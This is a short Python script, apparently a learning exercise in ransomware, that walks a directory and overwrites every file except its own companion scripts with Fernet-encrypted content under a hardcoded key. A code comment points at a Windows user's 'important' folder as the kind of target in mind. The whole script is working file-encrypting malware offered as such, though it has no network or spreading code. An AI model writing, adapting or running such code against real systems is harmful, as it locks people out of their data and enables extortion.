import os
from cryptography.fernet import Fernet
    
def encrypt(directory, key):
    
    #switch to desire dir
    os.chdir(directory)
    
    #grabs file names into a list
    files = []
    for file in os.listdir():
        if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py' or file == 'generate_key.py':
            continue
        if os.path.isfile(file):
            files.append(file)
    
    #encrypt   
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()  
        encrypted_content = Fernet(key).encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(encrypted_content)

# C/User/admin/important
path = '/home/bin2k2/code/ransomware/local'
key = b"cAC6jfAbQmFUKZguwlggHDwUH4i5Pcc_TToY_yc7aj0="

encrypt(path,key)

